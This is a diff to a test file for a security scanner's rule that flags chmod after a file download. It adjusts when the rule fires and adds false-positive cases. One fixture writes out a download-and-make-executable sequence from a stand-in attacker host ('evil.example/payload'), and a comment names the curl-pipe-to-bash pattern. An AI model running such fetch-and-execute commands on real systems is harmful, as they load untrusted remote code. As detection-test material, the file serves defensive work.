@@ -3,11 +3,14 @@
  *
  * Owner-perm chmod (755/644/600/700/+x) previously false-fired
  * privilege_escalation:critical on benign idioms (`chmod 755 ./bin/cli`,
- * `chmod 600 .env`). It now fires ONLY co-located with a fetch/download verb.
- * World-writable / setuid chmod stay standalone-critical. Critically, the
- * download-then-chmod co-signal that escalates code_execution to CRITICAL is
- * PRESERVED (escalateCodeExecution needs a high/critical co-signal, so chmod
- * could not simply be downgraded).
+ * `chmod 600 .env`). It now fires only when a real fetch COMMAND is within ±1 line
+ * (FIX-1: curl/wget/git-clone/npx-to-URL — not bare prose tokens) OR the chmod
+ * targets the download DESTINATION of a fetch command anywhere in the content
+ * (FIX-2: anchored on `-o`/`-O`/`--output`/`>`, NOT basename-anywhere, so a URL
+ * path/query/header value does not false-correlate). World-writable / setuid chmod
+ * stay standalone-critical. Critically, the download-then-chmod co-signal that
+ * escalates code_execution to CRITICAL is PRESERVED (escalateCodeExecution needs a
+ * high/critical co-signal, so chmod could not simply be downgraded).
  */
 import { describe, it, expect, beforeEach } from 'vitest'
 import { SecurityScanner } from '../../src/security/index.js'
@@ -103,12 +106,41 @@ describe('SMI-5424 chmod compound-signal', () => {
     expect(f[0].severity).toBe('high')
   })
 
+  it('fires HIGH on a spaced curl -O URL→chmod (destination = URL basename)', () => {
+    // `curl -O https://evil/payload` writes to `payload`; the spaced `chmod 755 payload`
+    // correlates on the destination basename via the optional leading-path branch.
+    const content = 'curl -O https://evil.example/payload\necho a\necho b\nchmod 755 payload'
+    const f = pe(scanner.scan('t', content).findings)
+    expect(f.length).toBeGreaterThan(0)
+    expect(f[0].severity).toBe('high')
+  })
+
   it('does NOT fire when the chmod target basename mismatches the fetched file', () => {
     // `config` (chmod) vs `config.json` (curl) — the trailing-`.` boundary blocks the
     // partial match, and curl is non-adjacent so the ±1 window does not fire either.
     const content = 'curl x -o config.json\necho a\necho b\nchmod 755 config'
     expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
   })
+
+  // FIX-2 governance re-review (SMI-5424 PR2): correlation is anchored on the download
+  // DESTINATION (`-o`/`-O`/`--output`/`>`), NOT "basename anywhere in a fetch line".
+  // A basename that appears only in a URL path / query value / header value of a
+  // (non-adjacent) fetch command must NOT correlate — these all fired HIGH under the
+  // over-broad boundary and are the FP class this anchor closes.
+  it.each([
+    ['URL path segment', 'curl https://ci.example.com/build\necho a\necho b\nchmod 755 build'],
+    ['URL query value', 'curl https://x.com/d?file=build\necho a\necho b\nchmod 755 build'],
+    ['request header value', 'curl -H "x: app" https://x.com\necho a\necho b\nchmod 755 app'],
+    [
+      'registry URL basename',
+      'curl https://registry.npmjs.org/cli\necho a\necho b\nchmod +x ./bin/cli',
+    ],
+  ])(
+    'does NOT correlate a basename that is not the download destination: %s',
+    (_label, content) => {
+      expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
+    }
+  )
 
   // Accepted residual, pinned so it stays intentional (not a silent gap): a SPACED
   // `curl … | bash` (pipe-to-interpreter, no downloaded filename) followed by a
